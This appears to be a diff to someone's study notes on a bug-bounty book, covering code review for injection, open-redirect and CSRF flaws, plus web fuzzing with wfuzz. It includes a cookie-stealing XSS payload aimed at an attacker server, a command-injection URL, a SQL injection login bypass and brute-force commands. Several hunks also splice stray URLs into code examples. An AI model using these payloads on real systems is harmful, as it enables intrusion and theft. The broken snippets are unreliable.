@@ -26,6 +26,10 @@
 - [Chapter 19: Same-Origin Policy Vulnerabilities](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-19-same-origin-policy-vulnerabilities)
 - [Chapter 20: Single-Sign-On Security Issues](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-20-single-sign-on-security-issues)
 - [Chapter 21: Information Disclosure](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-21-information-disclosure)
+- [Chapter 22: Conducting Code Reviews](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-22-conducting-code-reviews)
+- [Chapter 23: Hacking Android Apps](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-23-hacking-android-apps)
+- [Chapter 24: API Hacking](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-24-api-hacking)
+- [Chapter 25: Automatic Vulnerability Discovery Using Fuzzers](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-25-automatic-vulnerability-discovery-using-fuzzers)
 
 ### Chapter 1: Picking a Bug Bounty Program
 
@@ -1767,6 +1771,7 @@ _Bypass CSRF Tokens Stored on the Server_
   </html>
   ```
 
+  https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-21-information-disclosure)
   and:
 
   ```
@@ -2018,7 +2023,7 @@ _Take Over User Accounts by Using CSRF_
   document.body.innerHTML += "
     <form method="POST" action="https://email.example.com/set_password" id="csrf-form">
       <input type="text" name="new_password" value"this_account_is_now_mine">
-      <input type='submit' value="Submit">
+      <input type='submit' value="Submit">https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-21-information-disclosure)
     </form>;
   document.getElementById("csrf-form").submit();
 </script>
@@ -2372,6 +2377,7 @@ _Step 4: Create a Proof of Concept_
     - Example: You successfully doubled the $3000 but the application checks for these double deposits and corrects them, however, it only does this for double deposits. If you were to triple or quadruple the deposit, it may only correct a portion of the duplicated funds.
 
 **Finding Your First Race Condition!**
+https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-21-information-disclosure)
 
 1. Spot the features prone to race conditions in the target application and copy the corresponding requests.
 2. Send multiple of these critical requests to the server simultaneously. You should craft requests that should be allowed once but not allowed multiple times.
@@ -2457,7 +2463,7 @@ _Step 1: Spot Features Prone to SSRFs_
   POST /upload_profile_from_url
   Host: public.example.com
 
-  (POST request body)
+  (POST request body)https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-21-information-disclosure)
   user_id=1234&url=https://attacker.com/profile.jpeg
   ```
 
@@ -2554,7 +2560,7 @@ _Bypass Allowlists_
     POST /upload_profile_from_url
     Host: public.example.com
 
-    (POST request body)
+    (POST request body)https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-21-information-disclosure)
     user_id=1234&url=https://pics.example.com/123?redirect=127.0.0.1
     ```
 
@@ -5086,3 +5092,395 @@ _Debug Functionalities, Configuration Files, and Endpoints_
 - Look for additional paths, deprecated endpoints, and endpoints in development.
 
 **The Detailed Approach**
+
+_Important Functions_
+
+- When reading source code, focus on important functions like authentication, password reset, state-changing actions, and sensitive info reads.
+- ex. Python login function:
+  ```
+  def login()
+    query = "SELECT * FROM users WHERE username = '" + \
+    request.username + "' AND password = '" + \
+    request.passwd + "';"
+  authed_user = database_call(query)
+  login_as(authed_user)
+  ```
+  - This function looks for a user in the database by using a SQL query constructed from the username and password provided by the user. If the username and password exist, the function logs in the user.
+  - This code contains a classic SQL injection vulnerability.
+  - The application uses user input to form a SQL query without sanitizing the input in any way.
+  - By entering `admin'--` as the username, the attacker would be able to successfully login as the admin user because the query would look like this:
+    `SELECT password FROM users WHERE username = 'admin' --' AND password = '';`
+
+_User Input_
+
+- Read the code that processes user input such as HTTP request parameters, HTTP headers, HTTP request paths, database entries, file reads, and file uploads that provide the entry points for attackers to exploit the application's vulnerabilities.
+  - This helps find stored XSS, SQL injections, and XXEs.
+- Focusing on parts of the code that deal with user input will provide a good starting point for identifying potential dangers.
+- Make sure to take note of how the user input get stored or transferred.
+- Look for other parts of the application that use the previously processed user input.
+- ex. The following accepts user input using the PHP variable `$_GET` which contains the parameters submitted in the URL query string. The variable `$_GET['next']` refers to the value of the URL query parameter named `next`:
+
+  ```
+  <?php
+
+    [...]
+
+    if ($logged_in){
+    $redirect_url = $_GET['next'];
+    header("Location: ". $redirect_url);
+    exit;
+    }
+
+    [...]
+
+  ?>
+  ```
+
+  - The URL query string parameter gets stored in the `$redirect_url` variable.
+  - Then the `header()` PHP function sets the response header `Location` to that variable.
+  - The user will be redirected to the location specified in the `next` URL parameter.
+  - This is an open redirect vulnerability.
+  - The `next` URL query parameter is used to redirect the user after login, but the application doesn't validate the redirect URL before redirecting the user.
+    - It just takes the value of the URL query parameter `next` and sets the response header accordingly.
+
+- ex. A more robust version of the above vulnerability:
+
+  ```
+  <?php
+
+  [...]
+
+  if ($logged_in){
+    $redirect_url = $_GET['next'];
+
+    if preg_match("/example.com/", $redirect_url){
+      header("Location: ". $redirect_url);
+      exit;
+    }
+  }
+
+  [...]
+
+  ?>
+  ```
+
+  - This contains _some_ input validation: the `preg_match(PATTERN, STRING)` PHP function checks whether the STRING matches the regex pattern PATTERN.
+  - Although the application now validates the redirect URL before redirecting the user, it does so incompletely.
+  - It only checks whether the redirect URL contains the string example.com so if the attacker were to host a malicious page like `example.com.hacker.com` the application would still be vulnerable to an open redirect.
+
+- ex. This example shows how tracing input can point us to vulnerabilities. The `parse_url(URL, COMPONENT)` PHP function parses a URL and returns the specified URL component. `parse_url(https://www.example.com/index.html", PHP_URL_PATH)` returns the `/index.html` string which is the filepath portion of the URL.
+
+  ```
+  <?php
+
+    [...]
+
+    $url_path = parse_url($_GET['download_file'], PHP_URL_PATH);
+    $command = 'wget -o stdout https://example.com' . $url_path;
+    system($command, $output);
+    echo "<h1> You requested the page:" . $url_path . "</h1>";
+    echo $output;
+
+    [...]
+
+  ?>
+  ```
+
+  - This snippet contains a command injection vulnerability and a reflected XSS vulnerability. They exist in the user supplied `download_file` parameter.
+  - This code retrieves the `download_file` URL query parameter and parses the URL to retrieve its path component.
+  - The server then downloads the file located on the website server with the filepath that matches the path in the `download_file` URL:
+    `https://example.com/download?download_file=https://example.com/abc`
+  - The PHP `system()` command executes a system command, and `system(COMMAN, OUTPUT)` will store the output of COMMAND into the variable OUTPUT.
+  - This program passes user input into a variable `$command`, then into the `system()` function.
+  - Therefore, users can get arbitrary code execution by injecting their payload into the `$url_path`:
+    `https://example.com/download?download_file=https://example.com/download;ls`
+  - The application will display a message on the web page using direct user input.
+  - Attackers could embed an XSS payload in the `download_file`'s URL path portion and get it reflected onto the victim's page after a victim user accesses the crafted URL.
+
+    - The exploit URL can be generated with this code:
+
+    ```
+    <?php
+      $exploit_string = "<script>document.location='http://attacker_server_ip/cookie_stealer.php?c='+document.cookie;</script>";
+
+      echo "https://example.com/" . $exploit_string;
+    ?>
+    ```
+
+**Exercise: Spot the Vulnerabilities**
+
+- The following program has multiple issues. See how many you can find:
+
+```
+import requests
+import urllib.parse as urlparse
+from urllib.parse import parse_qs
+api_path = "https://api.example.com/new_password"
+user_data = {"new_password":"", "csrf_token":""}
+
+def get_data_from_input(current_url):
+  # get the URL parameters
+  # todo: we might want to stop putting user passwords # Error 1
+  # and token in the URL! This is really not secure.
+  # todo: we need to ask for the user's current password before they can change it!
+  url_object = urlparse.urlparse(current_url)
+  query_string = parse_qs(url_object.query)
+  try:
+    user_data["new_password"] = query_string["new_password"][0]
+    user_data["csrf_token"][0]
+  except: pass
+
+def new_password_request(path, user_data):
+  if user_data["csrf_token"]:                          # Error 2
+    validate_token(user_data["csrf_token"])
+  resp = requests.Response()
+  try:
+    resp = requests.post(url=path, header=headers, timeout=15, verify=False, data=user_data)
+    print("Your new password is set!")
+  except: pass
+
+def validate_token(csrf_token):
+  if (csrf_token == session.csrf_token):
+    pass
+  else:
+    raise Exception("CSRF token incorrect. Request rejected.")
+
+def validate_referer():                                 # Error 3
+  # todo: Implement actual referer check! Now the function is a placeholder.  # Error 3.5
+  if self.request.referer:
+    return True
+  else:
+    throw_error("Referer incorrect. Request rejected.")
+
+if __name__ == "__main__":
+  validate_referer()
+  get_data_from_input(self.request.url)
+  new_password_request(api_path, user_data)
+```
+
+- Errors:
+  - The source code contains multiple compromising developer comments which point out security flaws.
+    - These being that both the user's new password and CSRF token are communicated in the URL.
+      - Having secrets communicated in the URL is bad practice because they may be made available to browser history, browser extensions, and traffic analytics providers.
+    - Another comment points out that the user's current password isn't required to change to a new password.
+    - The last revealing comment is that the CSRF referer check functionality is incomplete.
+- Error 2:
+  - The site checks that the CSRF token is valid only if the `csrf_token` parameter is provided in the URL.
+  - Attackers will be able to execute the CSRF to change users' passwords by simply providing them with a URL that doesn't have the `csrf_token` parameter, or contains a blank `csrf_token` as in these examples:
+    `https://example.com/change_password?new_password=abc&csrf_token=`
+    `https://example.com/change_password?new_password=abc`
+- Error 3:
+
+  - The referer check function checks only if the referer is present, not whether the referer URL is from a legitimate site.
+
+- Manual code review can be time-consuming, using static analysis security testing (SAST) tools is a great way to automate the process.
+
+[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)
+
+### Chapter 23: Hacking Android Apps
+
+I'm not super interested in hacking android apps at the moment. I may come back and fill this out if that changes in the future.
+
+[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)
+
+### Chapter 24: API Hacking
+
+If you're interested in API hacking, I recommend the book _Hacking APIs: Breaking Web Applications Programming Interfaces_ by Corey J. Ball. It's about the same size as this book and is entirely dedicated to learning API hacking.  
+I might come back and do this section, I also might do a work through of the above mentioned book in the near future.
+
+[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)
+
+### Chapter 25: Automatic Vulnerability Discovery Using Fuzzers
+
+"Manual testing is great for discovering new and unexpected attack vectors. It can also help you learn new security concepts in depth. But manual testing also takes a lot of time and effort, so as with automating reconnaissance, you should strive to automate at least part of the process of finding bugs. Automated testing can help you tease out a large number of bugs within a short time frame."  
+"The best-performing bug bounty hunters automate most of their hacking process. They automate their recon, and write programs that constantly look for vulnerabilities on the targets of their choice. Whenever their tools notify them of a potential vulnerability, they immediately verify and report it."
+
+**What is Fuzzing?**
+
+- Fuzzing is the process of sending a wide range of invalid and unexpected data to an application and monitoring the application for exceptions with the goal of inducing unexpected behavior that may indicate an exploitable bug.
+  - Fuzzing is particularly good at exposing memory leaks, control flow issues, and race conditions.
+  - You can fuzz compiled binaries for vulnerabilities with tools like the [American Fuzzy Lop (AFL)](https://github.com/google/AFL).
+- Web application fuzzing is a technique that attempts to expose common web vulnerabilities like injections, XSS, and authentication bypass.
+
+**How a Web Fuzzer Works**
+
+- Web fuzzers automatically generate malicious requests by inserting the payloads of common vulnerabilities into web application injection points. They then fire off these requests and keep track of the server's responses.
+- ex. [Wfuzz](https://github.com/xmendez/wfuzz/): When provided a wordlist and an endpoint, wfuzz replaces all locations marked FUZZ with strings from the wordlist.
+  `wfuzz -w common_paths.txt http://example.com/FUZZ`
+  - Provide a different wordlist for each type of vulnerability you scan for.
+  - The above example would use wfuzz as a directory enumerator and would return something like:
+  ```
+  http://example.com/admin
+  http://example.com/admin.php
+  http://example.com/cgi-bin
+  http://example.com/secure
+  http://example.com/authorize.php
+  ...
+  ```
+- You can use wfuzz act like an IDOR scanner by providing it with potential ID values:
+  `wfuzz -w ids.txt http://example.com/view_inbox?user_id=FUZZ`
+  - In this example, ids.txt is a list of numeric IDs and will generate a series of requests like:
+  ```
+  http://example.com/view_inbox?user_id=1
+  http://example.com/view_inbox?user_id=2
+  http://example.com/view_inbox?user_id=3
+  ...
+  ```
+- Fuzzers are quite flexible in the vulnerabilities they test for.
+- You can customize them to their fullest extent by specifying different payloads and injection points.
+
+**The Fuzzing Process**
+
+_Step 1: Determine the Data Injection Points_
+
+1. What are the endpoints that take user input?
+2. What are the parameters used?
+3. What headers does the application user?
+
+- You can think of these parameters and headers as _data injection points_ or _data entry points_.
+
+- When you see a numeric ID, you should test for IDOR.
+- When you see a search bar, you should test for reflected XSS.
+
+_Data entry points to test for IDORS:_
+
+```
+GET /email_inbox?user_id=FUZZ
+Host: example.com
+```
+
+```
+POST /delete_user
+Host: example.com
+
+(POST request parameter)
+user_id=FUZZ
+```
+
+_Data entry points to test for XSS:_
+
+```
+GET /search?q=FUZZ
+Host: example.com
+```
+
+```
+POST /send_email
+Host: example.com
+
+(POST request parameter)
+user_id=abc&title=FUZZ&body=FUZZ
+```
+
+_Step 2: Decide on the Payload List_
+
+- You should fuzz each injection point with common payloads of the most likely vulnerabilities based on the data injection endpoints you find.
+- Feeding XSS payloads and SQL injection payloads into most data entry points is usually worthwhile.
+- [SecLists](https://github.com/danielmiessler/SecLists/) by Daniel Miessler and [Big List of Naughty Strings](https://github.com/minimaxir/big-list-of-naughty-strings/) by Max Woolf for some very comprehensive lists for fuzzing web apps.
+  - Also see [FuzzDB](https://github.com/fuzzdb-project/fuzzdb/)
+- Create custom payloads that are extremely long, payloads that contain odd characters of various encodings, and payloads that contain certain special characters like newline characters, line-feed characters, and more.
+- Use bash scripts ([Chapter 5](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#writing-your-own-recon-scripts)) to automate the generation of random payloads - you can use /dev/random if you're on Linux.
+
+_Step 3: Fuzz_
+
+- BurpSuite intruder offers a fuzzer with a graphical user interface.
+  - Whenever you encounter a request you'd like to fuzz, you can right-click it and choose "Send to Intruder".
+  - Configure your fuzzer settings, select your data injection points and payload list, and start fuzzing.
+  - The free version of BurpSuite has limited functionality, and time-throttles it's attacks - So it's artificially slow.
+- Unless you have BurpSuitePro, you'd be better served by using OWASP ZAP or Wfuzz.
+  - **Sometimes throttling your fuzzer will be necessary to prevent disruption to the application's operations.**
+    - Not going to be an issue for bigger companies.
+    - Could result in a DoS attack on companies without scaling architectures if you fuzz their applications without time throttling.
+
+_Step 4: Monitor the Results_
+
+- Analyze the results the fuzzer returned looking for patterns and anomalies in the server responses.
+- When fuzzing for path names (Dirbusting) use status codes to indicate whether a path is present:
+  - A 200 status code would indicate there is something there.
+  - A 404 status code would indicate there is nothing there.
+- When fuzzing for SQL injection look for a change in response content length or time.
+  - If the returned content for a certain payload is longer or shorter than other payloads, it might indicate that your payload was able to influence the database's operation and change what it returned.
+  - If the response time for a payload is longer than the others, it may indicate some interaction with the database that is different than a standard response.
+
+**Fuzzing with Wfuzz**
+
+_Path Enumeration (Directory Busting)_
+
+- ex. `wfuzz -w wordlist.txt -f output.txt --hc 404 --follow http://example.com/FUZZ`
+  - `-w` flag specifies the wordlist used for fuzzing.
+  - `-f` flag specifies the output file location and is followed by the file name for the output of the scan (`output.txt`).
+  - `--hc 404` tells wfuzz to exclude responses that have a 404 (not found) status code.
+  - `--follow` flag tells Wfuzz to follow all HTTP redirections so that our results show the URL's actually destination.
+
+_Brute-Forcing Authentication_
+
+- If you find paths that return a 403 Forbidden response, they may be candidates for brute forcing, or at the very least, candidates for authentication bypass attacks.
+- You can use the `-H` flag to specify custom headers.
+- If the application uses HTTP's _basic_ authentication scheme as access control, you can fuzz it with the following:
+  `wfuzz -w wordlist.txt -H "Authorization: Basic FUZZ" http://example.com/admin`
+  - The basic authentication scheme uses a header named `Authorization` to transfer credentials that are the base64-encoded strings of username and password pairs.
+  - If your username and password were `admin` and `password`, your authentication string would be `base64(admin:password)` or `YWRtaW46cGFzc3dvcmQ=`.
+    - You would want to use a script that would take username and password pairs and base64 encode them to an output file.
+  - A better way to do this is by using wfuzz's `--basic` option.
+  - Note: you can specify which wordlist to use where by using `FUZZ`, `FUZ2Z`, `FUZ3Z`.
+    - FUZZ is the first wordlist passed in, FUZ2Z is the second, etc.
+      `wfuzz -w usernames.txt -w passwords.txt --basic FUZZ:FU2Z http://example.com/admin`
+- Other ways to bypass authentication by using brute-forcing include switching out the `User-agent` header or forging custom headers used for authentication.
+  - Use wfuzz to bruteforce HTTP request headers. \*Book does not give example or expand on this, so I have below with a few extra flags that might be useful:
+    `wfuzz -H "header_name: FUZZ" -c --hh=header_name.txt -w wordlist.txt -t 10 -u http://example.com/admin --hc 404,403 --tc 5`
+    - `-hh` flag is used to define a file with headers.
+    - `-t` flag sets the number of concurrent threads.
+    - `-u` flag sets the URL
+    - `-tc` sets the total number of requests before exiting.
+
+_Testing for Common Web Vulnerabilities_
+
+- Use wfuzz to automatically test for common web vulnerabilities.
+- Testing for IDORs:
+  `wfuzz -w wordlist.txt http://example.com/view_message?message_id=FUZZ`
+- Testing for open redirects:
+  `wfuzz -w wordlist.txt -v --follow http://example.com?redirect=FUZZ`
+  - `-v` turns on verbose mode for more information and `--follow` will follow the redirect.
+  - This can be use to see if the redirect works ie. it redirects to your malicious page.
+- Testing for XSS:
+  `wfuzz -w xss.txt --filter "content~FUZZ" http://example.com/get_user?user_id=FUZZ`
+  - The `--filter` flag lets you set a result filter.
+    - The `"content~STRING"` filter returns responses that contain whatever STRING is.
+- Testing for SQL injection:
+  `wfuzz -w sqli.txt -d "user_id=FUZZ" http://example.com/get_user`
+  - Use a pre-made SQL injection wordlist and monitor for anomalies in the response time, response code, or response length of each payload.
+  - Specify POST body data with the `-d` flag.
+- For more wfuzz tricks, read their [documentation](https://wfuzz.readthedocs.io/).
+
+**Pitfalls of Fuzzing**
+
+- You may not be able to send a large number of payloads to the application without the server detecting your activity, or hitting some kind of rate limit.
+  - This can cause your testing to slow down or the server might ban you from the service.
+- In black box testing, it may be difficult to accurately evaluate the impact of the bug found through fuzzing since you don't have access to the code and are getting a limited sample of the application's behavior.
+  - You'll often need to conduct further manual testing to classify the bug's validity and significance.
+  - Fuzzing is like using a metal detector, it merely points you to the suspicious spots.
+- Not great for detecting business logic errors, or bugs that require multiple steps to exploit.
+
+**Adding to your Automated Testing Toolkit**
+
+- Automated testing tools can help you discover bugs but also hinder your learning progress if you don't take the time to udnerstand how ech tool in your testing toolkit works.
+  - Before adding a tool to your workflow, be sure to read the documentation and understand how it works.
+  - Read the source code if it's available. This can give you insight into how the best hackers in the field approach their testing (they're often the ones building these tools).
+  - Learning how tools work and are written can help you to start building your own tools.
+- Challenge:
+  - Read the source code of [Sublis3r](https://github.com/abou131a/Sublis3r/) and [Wfuzz](https://github.com/xmendez/wfuzz/).
+  - Describe how Sublist3r approaches subdomain enumeration.
+  - Describe how Wfuzz fuzzes applications.
+  - Write down their application logic, starting with the point at which they receive an input target and ending when they output the results.
+  - Try to rewrite the functionalities they implement using a different approach.
+  - Once you're very familiar with how they work, try modifying them to add new features.
+  - If your modifications work and you think others would benefit, try contributing to the open source project.
+
+Last note from me:
+
+You'll need to test your scripts to know if they're actually working. I suggest using machines from vulnhub, or hackthebox, or using them on the DVWM (Damn Vulnerable Web App).  
+If you've created a script to automate IDOR enumeration or something of the sort, download a VM from vulnhub that has the vulnerability your script should detect/exploit/etc, then test your script on it. You'll know it's at least working in some cases if it works on a machine that is vulnerable to what the script is trying to detect/exploit/etc. Otherwise you could just be wasting your time thinking nothing is vulnerable to <Whatever your script is trying to find> anymore, when really it's your script.
+
+Good Luck Nerds!
+
+[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)
